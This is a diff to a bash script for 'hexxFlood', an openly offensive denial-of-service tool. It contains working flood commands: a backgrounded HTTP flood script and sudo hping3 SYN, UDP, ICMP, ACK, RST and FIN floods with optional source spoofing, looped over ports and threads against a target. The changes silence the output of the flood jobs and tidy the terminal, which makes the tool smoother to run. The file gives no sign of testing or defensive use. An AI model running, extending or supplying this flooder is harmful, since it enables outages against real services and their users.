@@ -228,9 +228,9 @@ print("HTTP flood stopped")
 PYEOF
 
     if [ -f "/opt/hexxFlood-venv/bin/python" ]; then
-        /opt/hexxFlood-venv/bin/python /tmp/http_flood.py "$url" "$threads" "$duration" &
+        /opt/hexxFlood-venv/bin/python /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
     else
-        python3 /tmp/http_flood.py "$url" "$threads" "$duration" &
+        python3 /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
     fi
 }
 
@@ -453,6 +453,7 @@ monitor_attack() {
     local dur_disp="∞"; [ "$duration" -gt 0 ] && dur_disp="${duration}s"
 
     # ---- streaming header: printed ONCE; the whole run scrolls below it ----
+    ( stty sane </dev/tty ) >/dev/null 2>&1 || true   # clean terminal before streaming
     show_banner
     echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
     echo -e "${WHITE}                 ☢️  hexxFlood LIVE STREAM  ☢️${NC}"
@@ -510,9 +511,10 @@ cleanup() {
     CLEANUP_DONE=1
 
     # A flood child killed with -9 can leave the TTY in raw mode (newlines stop
-    # doing a carriage return -> the "staircase" mess). Restore a sane terminal.
-    stty sane 2>/dev/null
-    printf '\033[?7h\033[?25h\033[0m\r'   # wrap on, cursor on, reset attrs, col 0
+    # doing a carriage return -> the "staircase" mess). Restore the REAL terminal
+    # (target /dev/tty, not the script's stdin which may be redirected).
+    ( stty sane </dev/tty ) >/dev/null 2>&1 || true
+    printf '\033[?7h\033[?25h\033[0m\r' 2>/dev/null
 
     # Detach background flood jobs so bash won't print async "Killed" notices
     disown -a 2>/dev/null || true
@@ -642,12 +644,12 @@ main() {
         for i in $(seq 1 $THREADS); do
             for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
                 case $type in
-                    syn) for p in $TCP_PORTS; do sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
-                    udp) for p in $UDP_PORTS; do sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
-                    icmp) sudo hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
-                    ack) for p in $TCP_PORTS; do sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
-                    rst) for p in $TCP_PORTS; do sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
-                    fin) for p in $TCP_PORTS; do sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
+                    syn) for p in $TCP_PORTS; do sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    udp) for p in $UDP_PORTS; do sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    icmp) sudo hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & ;;
+                    ack) for p in $TCP_PORTS; do sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    rst) for p in $TCP_PORTS; do sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    fin) for p in $TCP_PORTS; do sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
                 esac
             done
         done
